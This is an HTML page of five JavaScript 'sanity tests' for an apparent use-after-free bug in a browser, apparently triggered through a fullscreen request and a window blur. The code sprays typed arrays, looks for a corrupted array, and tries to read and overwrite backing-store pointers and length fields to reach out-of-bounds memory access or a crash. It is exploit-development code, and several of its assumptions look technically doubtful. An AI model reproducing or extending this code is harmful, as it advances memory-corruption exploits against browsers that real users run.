<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Sanity Tests</title>
</head>
<body>

<h1>SANITY TESTS - REAL vs SIMULATION</h1>

<h2>TEST 1: Verify OOB Access is Real</h2>
<button onclick="t1()">RUN</button>
<div id="r1"></div>
<script>
function t1() {
    const r = document.getElementById('r1');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    // Create with UNIQUE values
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        for(let j = 0; j < 8; j++) {
            a[j] = i * 1000 + j; // UNIQUE identifier
        }
        arrays.push(a);
    }
    
    r.innerHTML += 'Arrays with unique values created<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        let originalIdx = -1;
        for(let i = 0; i < arrays.length; i++) {
            if(arrays[i][0] === P) {
                c = arrays[i];
                originalIdx = i;
                break;
            }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Corrupted array was arrays[' + originalIdx + ']<br>';
        r.innerHTML += 'Original values should be: ' + (originalIdx * 1000) + ' to ' + (originalIdx * 1000 + 7) + '<br>';
        
        r.innerHTML += '<br>Current values in corrupted array:<br>';
        for(let i = 0; i < 8; i++) {
            r.innerHTML += 'c[' + i + '] = ' + c[i] + '<br>';
        }
        
        r.innerHTML += '<br>SANITY CHECK:<br>';
        
        let allPattern = true;
        for(let i = 0; i < 8; i++) {
            if(c[i] !== P) {
                allPattern = false;
                break;
            }
        }
        
        if(allPattern) {
            r.innerHTML += '<b>REAL: All values overwritten with PATTERN</b><br>';
        } else {
            r.innerHTML += '<b>FAKE: Original values still present</b><br>';
        }
        
        // Test write
        const v = new DataView(c.buffer);
        v.setBigUint64(0, 0xDEADBEEFCAFEBABEn, true);
        
        const check = v.getBigUint64(0, true);
        r.innerHTML += '<br>Write test: 0xDEADBEEFCAFEBABE<br>';
        r.innerHTML += 'Read back: 0x' + check.toString(16) + '<br>';
        
        if(check === 0xDEADBEEFCAFEBABEn) {
            r.innerHTML += '<b>REAL: Write persisted</b><br>';
            
            // Now check if c[0] reflects this
            const asFloat = c[0];
            const buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = asFloat;
            const asHex = new BigUint64Array(buf)[0];
            
            r.innerHTML += 'c[0] as hex: 0x' + asHex.toString(16) + '<br>';
            
            if(asHex === 0xDEADBEEFCAFEBABEn) {
                r.innerHTML += '<b>REAL: DataView and array share same memory</b><br>';
            } else {
                r.innerHTML += '<b>FAKE: DataView is isolated</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>TEST 2: Verify Backing Store Pointer Write</h2>
<button onclick="t2()">RUN</button>
<div id="r2"></div>
<script>
function t2() {
    const r = document.getElementById('r2');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Read original backing store (if accessible)
        r.innerHTML += '<br>Attempting to read backing store pointer:<br>';
        
        // Try offsets where backing store might be
        const offsets = [8, 16, 24, 32];
        
        for(let off of offsets) {
            const ptr = v.getBigUint64(off, true);
            r.innerHTML += 'Offset ' + off + ': 0x' + ptr.toString(16) + '<br>';
        }
        
        r.innerHTML += '<br>Modifying backing store at offset 16:<br>';
        
        const originalPtr = v.getBigUint64(16, true);
        r.innerHTML += 'Original: 0x' + originalPtr.toString(16) + '<br>';
        
        // Try to change it
        const newPtr = 0x4142434445464748n;
        v.setBigUint64(16, newPtr, true);
        
        const checkPtr = v.getBigUint64(16, true);
        r.innerHTML += 'After write: 0x' + checkPtr.toString(16) + '<br>';
        
        if(checkPtr === newPtr) {
            r.innerHTML += '<b>Write confirmed</b><br>';
            
            // Now test if array access crashes or changes behavior
            r.innerHTML += '<br>Testing array access after ptr change:<br>';
            
            try {
                const val = c[0];
                r.innerHTML += 'c[0] = ' + val + '<br>';
                r.innerHTML += '<b>SANITY: No crash, but value unchanged</b><br>';
                r.innerHTML += '<b>CONCLUSION: Backing store not actually used by engine</b><br>';
            } catch(e) {
                r.innerHTML += 'c[0] crashed: ' + e.message + '<br>';
                r.innerHTML += '<b>REAL: Backing store affects access</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>TEST 3: Verify Cross-Array Visibility</h2>
<button onclick="t3()">RUN</button>
<div id="r3"></div>
<script>
function t3() {
    const r = document.getElementById('r3');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Write UNIQUE marker
        const marker = 0xBEEFCAFEDEADBEEFn;
        v.setBigUint64(0, marker, true);
        
        r.innerHTML += 'Wrote marker: 0x' + marker.toString(16) + '<br>';
        
        // Scan ALL arrays to see if any see this marker
        r.innerHTML += '<br>Scanning all 5000 arrays for marker:<br>';
        
        let found = [];
        for(let i = 0; i < arrays.length; i++) {
            const arr = arrays[i];
            for(let j = 0; j < arr.length; j++) {
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = arr[j];
                const val = new BigUint64Array(buf)[0];
                
                if(val === marker) {
                    found.push({arrIdx: i, elemIdx: j});
                }
            }
        }
        
        r.innerHTML += 'Found in ' + found.length + ' locations<br>';
        
        if(found.length === 0) {
            r.innerHTML += '<b>SANITY: Marker NOT visible to other arrays</b><br>';
            r.innerHTML += '<b>CONCLUSION: Still isolated in corrupted buffer</b><br>';
        } else if(found.length === 1 && found[0].arrIdx === arrays.indexOf(c)) {
            r.innerHTML += '<b>SANITY: Marker only in corrupted array itself</b><br>';
            r.innerHTML += '<b>CONCLUSION: No cross-array access</b><br>';
        } else {
            r.innerHTML += '<b>REAL: Marker visible in other arrays!</b><br>';
            for(let f of found) {
                r.innerHTML += '  arrays[' + f.arrIdx + '][' + f.elemIdx + ']<br>';
            }
        }
        
        // Also scan spray arrays
        r.innerHTML += '<br>Scanning spray arrays:<br>';
        let sprayFound = 0;
        
        for(let i = 0; i < Math.min(1000, spray.length); i++) {
            for(let j = 0; j < spray[i].length; j++) {
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = spray[i][j];
                const val = new BigUint64Array(buf)[0];
                
                if(val === marker) {
                    sprayFound++;
                    if(sprayFound <= 3) {
                        r.innerHTML += '  spray[' + i + '][' + j + ']<br>';
                    }
                }
            }
        }
        
        if(sprayFound > 0) {
            r.innerHTML += '<b>REAL: Found in ' + sprayFound + ' spray arrays</b><br>';
        } else {
            r.innerHTML += '<b>SANITY: Not in spray arrays</b><br>';
        }
    };
}
</script>

<hr>

<h2>TEST 4: Verify Length Field Modification</h2>
<button onclick="t4()">RUN</button>
<div id="r4"></div>
<script>
function t4() {
    const r = document.getElementById('r4');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Original length: ' + c.length + '<br>';
        r.innerHTML += 'Original byteLength: ' + c.byteLength + '<br>';
        
        const v = new DataView(c.buffer);
        
        // Try to modify length at various offsets
        r.innerHTML += '<br>Attempting to increase length:<br>';
        
        const newLength = 1000n;
        
        for(let off = 0; off < 64; off += 8) {
            v.setBigUint64(off, newLength, true);
            
            r.innerHTML += 'Wrote ' + newLength + ' at offset ' + off + '<br>';
            r.innerHTML += 'c.length = ' + c.length + '<br>';
            
            if(c.length !== 8) {
                r.innerHTML += '<b>REAL: Length changed to ' + c.length + '!</b><br>';
                
                // Try OOB access
                try {
                    const oob = c[100];
                    r.innerHTML += 'c[100] = ' + oob + '<br>';
                    
                    if(oob !== undefined) {
                        r.innerHTML += '<b>REAL OOB ACCESS!</b><br>';
                    }
                } catch(e) {
                    r.innerHTML += 'c[100] error: ' + e.message + '<br>';
                }
                
                break;
            }
        }
        
        if(c.length === 8) {
            r.innerHTML += '<br><b>SANITY: Length unchanged despite writes</b><br>';
            r.innerHTML += '<b>CONCLUSION: Length field not at accessible offset</b><br>';
        }
    };
}
</script>

<hr>

<h2>TEST 5: Crash Test (Proof of Real Memory Corruption)</h2>
<button onclick="t5()">RUN</button>
<div id="r5"></div>
<script>
function t5() {
    const r = document.getElementById('r5');
    r.innerHTML = 'Press OPTIONS<br>';
    r.innerHTML += '<b>WARNING: This may crash browser</b><br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Write clearly invalid pointer
        v.setBigUint64(16, 0x4141414141414141n, true);
        
        r.innerHTML += 'Wrote invalid pointer: 0x4141414141414141<br>';
        r.innerHTML += 'Attempting access in 2 seconds...<br>';
        
        setTimeout(() => {
            try {
                const val = c[0];
                r.innerHTML += 'c[0] = ' + val + '<br>';
                r.innerHTML += '<b>NO CRASH: Pointer not actually used</b><br>';
            } catch(e) {
                r.innerHTML += 'Exception: ' + e.message + '<br>';
            }
            
            // Try document.write (known to trigger crashes with corrupted state)
            r.innerHTML += '<br>Attempting document.write...<br>';
            
            setTimeout(() => {
                try {
                    document.open();
                    document.write('<html><body>Test</body></html>');
                    document.close();
                    r.innerHTML += '<b>NO CRASH</b><br>';
                } catch(e) {
                    r.innerHTML += 'document.write error: ' + e.message + '<br>';
                }
            }, 1000);
        }, 2000);
    };
}
</script>

<p>Execute all 5 sanity tests and report exact results</p>

</body>
</html>
